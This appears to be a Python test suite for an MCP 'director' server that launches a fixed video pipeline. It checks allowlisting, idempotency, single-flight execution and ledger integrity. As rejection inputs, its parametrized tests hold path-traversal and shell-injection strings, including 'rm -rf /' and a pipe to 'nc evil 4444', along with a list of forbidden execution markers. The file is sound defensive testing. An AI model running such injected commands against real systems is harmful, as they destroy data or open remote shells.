"""H4 director boundary tests — protocol-level + boundary-level, no LLM.

Covers the 20 required H4 test areas: contract rejections, allowlist,
traversal/injection attempts, idempotency, single-flight, AYCE result
semantics (stage failure, QA-FAIL, timeout), correlation, ledger
integrity, and no-mutation of mcp-ayce-readonly.

NO test spawns a real production run: execution is exercised through an
explicit stub runner seam (module-level `runner=` argument, or the
env-gated AYCE_DIRECTOR_STUB_RUNNER test seam over the real stdio
transport). The ONE real controlled execution is performed separately by
`controlled_execution.py` after this suite is green.

Run with the director's isolated venv:
    set PYTHONPATH=<repo>\\src
    mcp-ayce-director\\.venv\\Scripts\\python -m pytest mcp-ayce-director\\test_server.py
"""

import asyncio
import json
import os
import sys
import threading
from pathlib import Path

import pytest

HERE = Path(__file__).resolve().parent
REPO = HERE.parent
SERVER = HERE / "server.py"
READONLY_DIR = REPO / "mcp-ayce-readonly"

sys.path.insert(0, str(HERE))
import server as director  # noqa: E402

from mcp import ClientSession, StdioServerParameters  # noqa: E402
from mcp.client.stdio import stdio_client  # noqa: E402


# ---- helpers -----------------------------------------------------------------------

def _req(request_id="req-20260920T000000Z-test00000001", command="trigger_golden_path",
         script_id="documentary", reason="H4 boundary test", **extra):
    payload = {"request_id": request_id, "command": command,
               "script_id": script_id, "reason": reason}
    payload.update(extra)
    return payload


_REPORT_OK = {
    "ok": True,
    "run_id": "run-20260920T000000Z-cafe00000001",
    "job_id": "job-20260920T000000Z-cafe00000001",
    "run_dir": "data/runs/run-20260920T000000Z-cafe00000001",
    "production_id": "prod-1",
    "stages": [{"stage": s, "ok": True, "error": None} for s in (
        "script_to_scene", "asset_resolution", "narration_audio",
        "timeline", "captions", "production_render", "media_qa")],
    "qa_verdict": "PASS",
    "failed_stage": None,
    "error": None,
}


def _stub(outcome: dict, calls: list | None = None):
    def runner(argv, cwd, env, timeout_s):
        if calls is not None:
            calls.append({"argv": argv, "cwd": cwd, "timeout_s": timeout_s})
        return {"timed_out": False, "exit_code": 0, "stdout": "", "stderr": "",
                "started_at": "s", "finished_at": "f", **outcome}
    return runner


def _never_runs(argv, cwd, env, timeout_s):
    """Guard runner for validation tests: reaching it means the boundary
    tried to execute — a hard test failure (never a real spawn)."""
    raise AssertionError("boundary attempted execution on an invalid request")


def _report(report: dict, exit_code: int = 0) -> dict:
    return {"exit_code": exit_code, "stdout": json.dumps(report), "stderr": ""}


@pytest.fixture()
def ledger(tmp_path):
    return tmp_path / "requests.json"


def _read_ledger(path: Path) -> list:
    return json.loads(path.read_text(encoding="utf-8"))["requests"]


# ---- stdio transport helper (REAL MCP transport against the REAL server) -----------


def call_tool(env_extra: dict, name: str, arguments: dict | None = None,
              list_tools: bool = False):
    env = {k: v for k, v in os.environ.items()}
    env["AYCE_DIRECTOR_LEDGER"] = str(env_extra["AYCE_DIRECTOR_LEDGER"])
    env.update({k: v for k, v in env_extra.items() if k != "AYCE_DIRECTOR_LEDGER"})

    async def _run():
        params = StdioServerParameters(
            command=sys.executable, args=[str(SERVER)], env=env)
        async with stdio_client(params) as (read, write):
            async with ClientSession(read, write) as session:
                await session.initialize()
                if list_tools:
                    result = await session.list_tools()
                    return result
                result = await session.call_tool(name, arguments or {})
                texts = [b.text for b in result.content if getattr(b, "type", "") == "text"]
                return json.loads("\n".join(texts))

    return asyncio.run(_run())


# ---- 1: valid trigger_golden_path (boundary-level, stub runner) ---------------------


def test_valid_trigger_golden_path(ledger):
    calls = []
    result = director.handle_request(_req(), runner=_stub(_report(_REPORT_OK), calls), ledger_path=ledger)
    assert result["ok"] is True
    assert result["status"] == "succeeded"
    assert result["run_id"] == _REPORT_OK["run_id"]
    assert result["job_id"] == _REPORT_OK["job_id"]
    assert result["qa_verdict"] == "PASS"
    assert result["exit_code"] == 0
    assert len(calls) == 1
    argv = calls[0]["argv"]
    # fixed argv: pinned interpreter, -m ayce run, allowlisted script, --json
    assert argv[1:4] == ["-m", "ayce", "run"]
    assert argv[4].endswith("tests/fixtures/script_to_scene/documentary.json") or \
        argv[4].endswith("tests\\fixtures\\script_to_scene\\documentary.json")
    assert "--json" in argv
    assert calls[0]["cwd"] == str(REPO)
    # caller-controlled strings never enter argv
    assert all("req-20260920T000000Z" not in a and "boundary test" not in a for a in argv)


# ---- 2/3: missing request_id, invalid request_id ------------------------------------


@pytest.mark.parametrize("payload", [
    {k: v for k, v in _req().items() if k != "request_id"},
])
def test_missing_request_id_rejected(payload, ledger):
    result = director.handle_request(payload, runner=_never_runs, ledger_path=ledger)
    assert result["ok"] is False
    assert result["error"]["code"] == "invalid_request"
    assert _read_ledger(ledger)[-1]["status"] == "rejected"


@pytest.mark.parametrize("bad", [
    "req-",                                   # empty body
    "20260920T000000Z-test",                  # missing prefix
    "req-with spaces",
    "req-slash/escape",
    "req-dot-dot/../escape",
    "req-$({injection})",
    "req-" + "x" * 65,                        # too long
    12345,
    None,
])
def test_invalid_request_id_rejected(bad, ledger):
    payload = _req()
    payload["request_id"] = bad
    result = director.handle_request(payload, runner=_never_runs, ledger_path=ledger)
    assert result["ok"] is False
    assert result["error"]["code"] == "invalid_request_id"


# ---- 4: unknown command --------------------------------------------------------------


@pytest.mark.parametrize("command", [
    "run", "retry_run", "resume_run", "exec", "shell", "ayce run",
    "trigger_golden_path ", "TRIGGER_GOLDEN_PATH", "", None,
])
def test_unknown_command_rejected(command, ledger):
    result = director.handle_request(_req(command=command), runner=_never_runs, ledger_path=ledger)
    assert result["ok"] is False
    assert result["error"]["code"] == "unknown_command"
    # nothing was ever marked running
    assert not any(r["status"] == "running" for r in _read_ledger(ledger))


# ---- 5/6/7: unknown / path-like / traversal script_id --------------------------------


@pytest.mark.parametrize("script_id", ["", "documentary2", "other_script", "Documentary", None, 7])
def test_unknown_script_id_rejected(script_id, ledger):
    result = director.handle_request(_req(script_id=script_id), runner=_never_runs, ledger_path=ledger)
    assert result["ok"] is False
    assert result["error"]["code"] == "unknown_script"


@pytest.mark.parametrize("script_id", [
    "tests/fixtures/script_to_scene/documentary.json",   # path-like
    "C:\\Windows\\System32\\cmd.exe",                    # absolute Windows path
    "/etc/passwd",                                       # absolute POSIX path
    "..\\secret.json",
    "documentary/../other.json",
    "sub/documentary",
    "documentary.json",
])
def test_path_like_script_id_rejected(script_id, ledger):
    result = director.handle_request(_req(script_id=script_id), runner=_never_runs, ledger_path=ledger)
    assert result["ok"] is False
    assert result["error"]["code"] == "unknown_script"
    assert not any(r["status"] == "running" for r in _read_ledger(ledger))


@pytest.mark.parametrize("script_id", [
    "../etc/passwd",
    "a/../..//../windows",
    "..",
    "documentary/..",
])
def test_traversal_attempt_rejected(script_id, ledger):
    result = director.handle_request(_req(script_id=script_id), runner=_never_runs, ledger_path=ledger)
    assert result["ok"] is False
    assert result["error"]["code"] == "unknown_script"


# ---- 8/9/11: caller cannot inject executable / argv / environment --------------------


@pytest.mark.parametrize("extra", [
    {"executable": "C:\\Windows\\System32\\cmd.exe"},
    {"python": "evil.py"},
    {"args": ["--evil"]},
    {"argv": ["rm", "-rf", "/"]},
    {"script_path": "C:\\evil.json"},
    {"cwd": "C:\\"},
    {"env": {"AYCE_PIPER_MODEL": "x"}},
    {"AYCE_PIPER_MODEL": "x"},
    {"options": "--json"},
    {"request": "x"},
    {"run": True},
])
def test_arbitrary_injection_fields_rejected(extra, ledger):
    payload = _req(**extra)
    result = director.handle_request(payload, runner=_never_runs, ledger_path=ledger)
    assert result["ok"] is False
    assert result["error"]["code"] == "invalid_request"
    assert not any(r["status"] == "running" for r in _read_ledger(ledger))


# ---- 10: shell injection attempts -----------------------------------------------------


@pytest.mark.parametrize("script_id", [
    "documentary; rm -rf /",
    "documentary && calc",
    "documentary | nc evil 4444",
    "documentary`calc`",
    "documentary$(calc)",
    "a b c",
    "a\tb",
])
def test_shell_injection_script_id_rejected(script_id, ledger):
    result = director.handle_request(_req(script_id=script_id), runner=_never_runs, ledger_path=ledger)
    assert result["ok"] is False
    assert result["error"]["code"] == "unknown_script"


# ---- 12/13: duplicate identical / conflicting duplicate request_id -------------------


def test_duplicate_identical_request_id_runs_once(ledger):
    calls = []
    runner = _stub(_report(_REPORT_OK), calls)
    first = director.handle_request(_req(), runner=runner, ledger_path=ledger)
    second = director.handle_request(_req(), runner=runner, ledger_path=ledger)
    assert first["ok"] is True
    assert second["ok"] is False
    assert second["error"]["code"] == "duplicate_request"
    assert second["original"]["run_id"] == _REPORT_OK["run_id"]
    assert second["original"]["status"] == "succeeded"
    assert len(calls) == 1  # NO second production run
    # exactly one primary ledger record for the request_id
    records = [r for r in _read_ledger(ledger) if r.get("request_id") == _req()["request_id"]]
    assert len(records) == 1
    assert records[0]["status"] == "succeeded"


def test_conflicting_duplicate_request_id_rejected(ledger):
    calls = []
    runner = _stub(_report(_REPORT_OK), calls)
    first = director.handle_request(_req(), runner=runner, ledger_path=ledger)
    assert first["ok"] is True
    conflict = director.handle_request(_req(reason="a DIFFERENT reason"), runner=runner, ledger_path=ledger)
    assert conflict["ok"] is False
    assert conflict["error"]["code"] == "duplicate_request"
    assert "conflict" in conflict["error"]["message"].lower()
    assert len(calls) == 1  # nothing re-executed


# ---- 14: single-flight ----------------------------------------------------------------


def test_busy_when_request_already_running(ledger):
    # seed the ledger with an in-flight request (server restart scenario)
    ledger.write_text(json.dumps({"version": 1, "requests": [{
        "request_id": "req-20260920T000000Z-inflight00001",
        "command": "trigger_golden_path", "script_id": "documentary",
        "reason": "seeded", "status": "running"}]}), encoding="utf-8")
    calls = []
    result = director.handle_request(_req(), runner=_stub(_report(_REPORT_OK), calls),
                                     ledger_path=ledger)
    assert result["ok"] is False
    assert result["error"]["code"] == "busy"
    assert calls == []  # nothing executed
    statuses = [r["status"] for r in _read_ledger(ledger)]
    assert "running" in statuses and statuses[-1] == "rejected"


def test_concurrent_requests_single_flight(ledger):
    calls = []
    lock = threading.Lock()

    def slow_runner(argv, cwd, env, timeout_s):
        with lock:
            calls.append(argv)
        threading.Event().wait(0.3)
        return {"timed_out": False, "exit_code": 0,
                "stdout": json.dumps(_REPORT_OK), "stderr": "",
                "started_at": "s", "finished_at": "f"}

    results = []

    def worker(request_id):
        results.append(director.handle_request(
            _req(request_id=request_id), runner=slow_runner, ledger_path=ledger))

    t1 = threading.Thread(target=worker, args=("req-20260920T000000Z-flight0001",))
    t2 = threading.Thread(target=worker, args=("req-20260920T000000Z-flight0002",))
    t1.start(); t2.start(); t1.join(); t2.join()

    codes = sorted(r["error"]["code"] if not r["ok"] else "accepted" for r in results)
    assert codes == ["accepted", "busy"]          # exactly ONE in flight
    assert len(calls) == 1                        # exactly ONE execution
    ledger_records = _read_ledger(ledger)
    assert sum(1 for r in ledger_records if r["status"] == "succeeded") == 1
    assert not any(r["status"] == "running" for r in ledger_records)


# ---- 15/16/17: AYCE result semantics (stub runner — no hidden failures) ---------------


def test_ayce_stage_failure_preserves_run_id(ledger):
    failed = dict(_REPORT_OK, ok=False, qa_verdict=None,
                  stages=_REPORT_OK["stages"][:2],
                  failed_stage="narration_audio", error="narration stage failed")
    result = director.handle_request(_req(), runner=_stub(_report(failed, exit_code=1)),
                                     ledger_path=ledger)
    assert result["ok"] is False
    assert result["error"]["code"] == "execution_failed"
    assert result["run_id"] == failed["run_id"]      # correlation preserved
    assert result["failed_stage"] == "narration_audio"
    assert result["exit_code"] == 1
    record = _read_ledger(ledger)[0]
    assert record["status"] == "failed"
    assert record["run_id"] == failed["run_id"]


def test_ayce_exit_2_is_failed_pre_run(ledger):
    result = director.handle_request(
        _req(), runner=_stub({"exit_code": 2, "stdout": "",
                              "stderr": "ayce run: configuration error"}), ledger_path=ledger)
    assert result["ok"] is False
    assert result["error"]["code"] == "failed_pre_run"
    assert result["run_id"] is None
    assert _read_ledger(ledger)[0]["status"] == "failed"


def test_qa_fail_verdict_is_not_execution_failure(ledger):
    # AYCE P5.5: a deterministic QA FAIL is a SUCCEEDED stage — evidence, not error.
    qa_fail = dict(_REPORT_OK, qa_verdict="FAIL")
    result = director.handle_request(_req(), runner=_stub(_report(qa_fail)), ledger_path=ledger)
    assert result["ok"] is True                      # execution succeeded
    assert result["status"] == "succeeded"
    assert result["qa_verdict"] == "FAIL"            # truthfully surfaced
    assert _read_ledger(ledger)[0]["qa_verdict"] == "FAIL"


def test_timeout_is_truthful_never_success(ledger):
    result = director.handle_request(_req(), runner=_stub({"timed_out": True, "exit_code": None}),
                                     ledger_path=ledger)
    assert result["ok"] is False
    assert result["error"]["code"] == "timeout"
    assert "terminated" in result["error"]["message"]
    record = _read_ledger(ledger)[0]
    assert record["status"] == "timeout"
    assert record["run_id"] is None                  # no run claimed


# ---- 18/19: correlation + ledger integrity --------------------------------------------


def test_result_correlation_run_id_job_id(ledger):
    result = director.handle_request(_req(), runner=_stub(_report(_REPORT_OK)), ledger_path=ledger)
    record = _read_ledger(ledger)[0]
    assert record["request_id"] == result["request_id"]
    assert record["run_id"] == result["run_id"] == _REPORT_OK["run_id"]
    assert record["job_id"] == result["job_id"] == _REPORT_OK["job_id"]
    assert record["qa_verdict"] == result["qa_verdict"]
    # correlation is durable BEFORE/AFTER execution: argv recorded in the ledger
    assert record["argv"][1:4] == ["-m", "ayce", "run"]


def test_ledger_integrity_atomic_valid_json(ledger):
    director.handle_request(_req(), runner=_stub(_report(_REPORT_OK)), ledger_path=ledger)
    director.handle_request(_req(script_id="unknown_x"), ledger_path=ledger)
    data = json.loads(ledger.read_text(encoding="utf-8"))
    assert data["version"] == 1
    statuses = [r["status"] for r in data["requests"]]
    assert statuses[0] == "succeeded"
    assert statuses[1] == "rejected"
    # atomic writes leave no temp files behind
    assert not list(ledger.parent.glob("*.tmp"))
    # every record is complete and consistent
    for record in data["requests"]:
        assert set(record) >= {"request_id", "status", "requested_at"}
        if record["status"] == "succeeded":
            assert record["run_id"] and record["exit_code"] == 0


# ---- 20: no mutation of mcp-ayce-readonly / AYCE sources -------------------------------


def _snapshot(paths):
    snap = {}
    for path in paths:
        if path.is_file():
            snap[str(path)] = (path.read_bytes(), path.stat().st_mtime_ns)
    return snap


def test_readonly_server_and_ayce_sources_untouched(ledger, tmp_path):
    readonly_files = sorted(p for p in READONLY_DIR.rglob("*")
                            if p.is_file() and ".venv" not in p.parts and "__pycache__" not in p.parts)
    ayce_files = sorted((REPO / "src" / "ayce").glob("*.py"))

    def snapshot():
        return (_snapshot(readonly_files), _snapshot(ayce_files),
                (REPO / "src" / "ayce" / "pipeline.py").read_text(encoding="utf-8"))

    before = snapshot()
    # a full boundary session: rejections + one stub execution + duplicates
    for payload in (_req(), _req(command="run"), _req(script_id="../x"),
                    _req(script_id="tests/fixtures/script_to_scene/documentary.json")):
        director.handle_request(payload, runner=_stub(_report(_REPORT_OK)), ledger_path=ledger)
    director.handle_request(_req(), runner=_stub(_report(_REPORT_OK)), ledger_path=ledger)
    after = snapshot()
    assert before == after  # byte-identical, mtimes identical


# ---- static security checks on the server source ----------------------------------------


def test_server_source_has_no_shell_or_dynamic_execution():
    source = SERVER.read_text(encoding="utf-8")
    for marker in ("shell=True", "os.system", "popen(", "Popen(", "eval(", "exec(",
                   "__import__", "cmd.exe", "powershell", "/c ", "importlib",
                   "os.environ[", "json.loads(request"):
        assert marker not in source, f"forbidden capability in director server: {marker}"
    # exactly two fixed argv templates (H4 golden path + Stage 2 research)
    # plus the Stage 2.5 brief template, which REUSES the research subprocess
    # seam — each with exactly one guarded subprocess call (no shell, ever)
    assert source.count("subprocess.run(") == 2
    assert source.count("shell=False") == 2
    assert '"-m", "ayce", "run"' in source
    assert '"-m", "ayce.research", "--json"' in source
    assert '"-m", "ayce.research", "--brief", "--json"' in source


def test_malformed_payloads_rejected(ledger):
    for payload in (None, 42, "trigger_golden_path", [], {"request_id": "req-x"}):
        result = director.handle_request(payload, runner=_never_runs, ledger_path=ledger)
        assert result["ok"] is False
        assert result["error"]["code"] in ("invalid_request", "invalid_request_id")


# ---- protocol-level tests over the REAL MCP stdio transport -----------------------------


def test_stdio_tool_surface_is_one_write_tool_plus_research_and_brief(ledger):
    tools = call_tool({"AYCE_DIRECTOR_LEDGER": str(ledger)}, "", list_tools=True)
    by_name = {t.name: t for t in tools.tools}
    # H4: exactly ONE write tool; Stage 2: research; Stage 2.5: brief.
    assert set(by_name) == {"trigger_golden_path", "execute_research_slice",
                            "propose_script_brief"}
    schema = by_name["trigger_golden_path"].inputSchema
    assert set(schema["properties"]) == {"request_id", "command", "script_id", "reason"}
    assert set(schema.get("required", set())) == {"request_id", "command", "script_id", "reason"}
    research_schema = by_name["execute_research_slice"].inputSchema
    assert set(research_schema["properties"]) == {
        "objective", "niche", "query", "target_channels", "max_outliers"}
    assert set(research_schema.get("required", set())) == {"objective"}
    brief_schema = by_name["propose_script_brief"].inputSchema
    assert set(brief_schema["properties"]) == {"research_id"}
    assert set(brief_schema.get("required", set())) == {"research_id"}


def test_stdio_rejection_unknown_command(ledger):
    result = call_tool({"AYCE_DIRECTOR_LEDGER": str(ledger)}, "trigger_golden_path",
                       _req(command="retry_run"))
    assert result["ok"] is False
    assert result["error"]["code"] == "unknown_command"


def test_stdio_rejection_path_script_id(ledger):
    result = call_tool({"AYCE_DIRECTOR_LEDGER": str(ledger)}, "trigger_golden_path",
                       _req(script_id="C:\\Windows\\System32\\cmd.exe"))
    assert result["ok"] is False
    assert result["error"]["code"] == "unknown_script"


def test_stdio_valid_request_with_stub_runner_and_idempotency(ledger, tmp_path):
    stub_result = tmp_path / "stub.json"
    stub_result.write_text(json.dumps(_report(_REPORT_OK)), encoding="utf-8")
    env = {"AYCE_DIRECTOR_LEDGER": str(ledger),
           "AYCE_DIRECTOR_STUB_RUNNER": "1",
           "AYCE_DIRECTOR_STUB_RESULT": str(stub_result)}
    first = call_tool(env, "trigger_golden_path", _req())
    assert first["ok"] is True
    assert first["run_id"] == _REPORT_OK["run_id"]
    # duplicate over a SECOND server process (ledger persists across processes)
    second = call_tool(env, "trigger_golden_path", _req())
    assert second["ok"] is False
    assert second["error"]["code"] == "duplicate_request"
    assert second["original"]["run_id"] == _REPORT_OK["run_id"]
    records = _read_ledger(ledger)
    assert len([r for r in records if r["status"] == "succeeded"]) == 1


def test_stdio_no_secrets_or_env_in_responses(ledger):
    result = call_tool({"AYCE_DIRECTOR_LEDGER": str(ledger)}, "trigger_golden_path",
                       _req(command="bogus"))
    text = json.dumps(result)
    assert "AYCE_" not in text
    assert "PYTHONPATH" not in text
    assert "Path" not in text and "Traceback" not in text




